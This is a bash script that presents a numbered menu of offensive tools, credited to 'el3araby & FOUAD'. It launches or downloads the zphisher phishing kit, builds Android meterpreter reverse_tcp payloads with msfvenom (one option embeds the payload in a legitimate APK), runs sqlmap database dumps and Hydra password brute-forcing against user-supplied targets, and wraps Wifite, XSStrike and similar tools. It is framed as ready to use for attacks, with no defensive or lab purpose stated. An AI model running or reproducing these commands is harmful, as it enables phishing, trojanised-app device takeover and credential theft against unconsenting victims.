#!/bin/bash

banerelaraby(){

cat <<'EOF'
         ██╗██████╗  ██████╗     ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
         ██║██╔══██╗██╔═══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
         ██║██║  ██║██║   ██║    █████╗  ██║   ██║██║   ██║███████║██║  ██║
    ██   ██║██║  ██║██║   ██║    ██╔══╝  ██║   ██║██║   ██║██╔══██║██║  ██║
    ╚█████╔╝██████╔╝╚██████╔╝    ██║     ╚██████╔╝╚██████╔╝██║  ██║██████╔╝
     ╚════╝ ╚═════╝  ╚═════╝     ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
EOF

printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
echo "this tool is done by el3araby & FOUAD"

echo " ------------------------------------------------ "
echo " 1- zphisher                                    - "
echo " 2- ELARABYGBS                                  - "
echo " 3- MAKE A PAYLOAD FOR ANDROID                  - "
echo " 4- MAKE A PAYLOAD FOR ANDROID ON ORG APK       - "
echo " 5- run metasploit                              - "
echo " 6- download zphisher                           - "
echo " 7- download ELARABYGBS                         - "
echo " 8- SCAN ip or domain by nmap                   - "
echo " 9- download HACKINGTOOL                        - "
echo " 10- run HACKINGTOOL                            - "
echo " 11- Trying SQLMAP ON TARGET                    - "
echo " 12- HELP                                       - "
echo " 13- UPDATE AND UPGRADE YOUR LINUX              - "
echo " 14- CONTACT WITH ME                            - "
echo " 15- INSTALL XSStrike                           - "
echo " 16- RUN XSStrike                               - "
echo " 17- INSTALL Nikto                              - "
echo " 18- RUN Nikto                                  - "
echo " 19- INSTALL Hydra                              - "
echo " 20- RUN Hydra                                  - "
echo " 21- INSTALL theHarvester                       - "
echo " 22- RUN theHarvester                           - "
echo " 23- INSTALL Wifite                             - "
echo " 24- RUN Wifite                                 - "
echo " 25- RUN WHOIS Lookup                           - "
echo " 26- INSTALL Gobuster                           - "
echo " 27- RUN Gobuster                               - "
echo " 28- INSTALL John the Ripper                    - "
echo " 29- RUN John the Ripper                        - "
echo " 30- AUTO-INSTALL ALL TOOLS                     - "
echo " ------------------------------------------------- "
echo " enter the number of option you want to run  :   "
}

author(){
echo " ----------------------------- "
echo " this tool maded by fouad "
echo " I LOVE U "
echo " ----------------------------- "
}

el3araby(){
read choice

case $choice in
	1) echo "Running zphisher"; cd zphisher && bash zphisher.sh ;;
	2) echo "Running ELARABYGBS"; cd ELARABYGBS && bash el3araby.sh ;;
	3) echo "Making a payload"; 
	   read -p "ENTER LHOST: " LHOST
	   read -p "ENTER LPORT: " LPORT
	   read -p "ENTER apk final name: " NAME
	   msfvenom -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk ;;
	4) echo "Making payload with original APK"; 
	   read -p "ENTER APK path: " ORG
	   read -p "ENTER LHOST: " LHOST
	   read -p "ENTER LPORT: " LPORT
	   read -p "ENTER final name: " NAME
	   msfvenom -x $ORG -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk ;;
	5) echo "Running metasploit"; msfconsole ;;
	6) echo "Downloading zphisher"; git clone https://github.com/htr-tech/zphisher.git ;;
	7) echo "Downloading ELARABYGBS"; git clone https://github.com/b7of/ELARABYGBS.git ;;
	8) read -p "ENTER IP or DOMAIN: " IP; nmap -T4 -A -v $IP ;;
	9) echo "Downloading HACKINGTOOL"; 
	   git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh && sudo hackingtool ;;
	10) echo "Running HACKINGTOOL"; sudo hackingtool ;;
	11) read -p "ENTER TARGET LINK: " TARGET; sqlmap -u $TARGET --dbs --batch ;;
	12) echo "HELP MENU:
	   - 1-2: phishing/location
	   - 3-4: android payloads
	   - 5: metasploit
	   - 6-7-9: download tools
	   - 8: nmap scan
	   - 10: hackingtool
	   - 11: sqlmap
	   - 15-16: XSStrike
	   - 17-18: Nikto
	   - 19-20: Hydra
	   - 21-22: theHarvester
	   - 23-24: Wifite
	   - 25: WHOIS
	   - 26-27: Gobuster
	   - 28-29: John the Ripper
	   - 30: Auto install all tools";;
	13) echo "Updating system"; sudo apt-get update -y && sudo apt-get upgrade -y ;;
	14) echo "ENG : EL3ARABY & FOUAD
	   github : https://github.com/loals2sa
	   instagram : https://instagram.com/1.pvl
	   telegram : @blackhatfouad" ;;
	15) echo "Installing XSStrike"; git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip3 install -r requirements.txt ;;
	16) echo "Running XSStrike"; read -p "ENTER TARGET URL: " URL; cd XSStrike && python3 xsstrike.py -u $URL ;;
	17) echo "Installing Nikto"; sudo apt-get install nikto -y ;;
	18) echo "Running Nikto"; read -p "ENTER TARGET URL: " URL; nikto -h $URL ;;
	19) echo "Installing Hydra"; sudo apt-get install hydra -y ;;
	20) echo "Running Hydra"; 
	   read -p "ENTER TARGET: " TARGET
	   read -p "ENTER SERVICE (ssh, ftp..): " SERVICE
	   read -p "ENTER USERNAME: " USER
	   read -p "ENTER PASSWORD LIST: " PASSLIST
	   hydra -l $USER -P $PASSLIST $TARGET $SERVICE ;;
	21) echo "Installing theHarvester"; sudo apt-get install theharvester -y ;;
	22) echo "Running theHarvester"; read -p "ENTER DOMAIN: " DOMAIN; theHarvester -d $DOMAIN -l 500 -b google ;;
	23) echo "Installing Wifite"; sudo apt-get install wifite -y ;;
	24) echo "Running Wifite"; sudo wifite ;;
	25) echo "WHOIS Lookup"; read -p "ENTER DOMAIN: " DOMAIN; whois $DOMAIN ;;
	26) echo "Installing Gobuster"; sudo apt-get install gobuster -y ;;
	27) echo "Running Gobuster"; 
	   read -p "ENTER DOMAIN: " DOMAIN
	   read -p "ENTER WORDLIST PATH: " WORDLIST
	   gobuster dir -u http://$DOMAIN -w $WORDLIST ;;
	28) echo "Installing John the Ripper"; sudo apt-get install john -y ;;
	29) echo "Running John the Ripper"; read -p "ENTER PASSWORD FILE PATH: " FILE; john $FILE ;;
	30) echo "Auto installing all tools..."
	    sudo apt-get install -y nikto hydra theharvester wifite gobuster john
	    git clone https://github.com/htr-tech/zphisher.git
	    git clone https://github.com/b7of/ELARABYGBS.git
	    git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh
	    git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip3 install -r requirements.txt
	    echo "All tools installed." ;;
	*) echo "Invalid option (1-30)";;
esac
}

# تشغيل القائمة
banerelaraby
el3araby

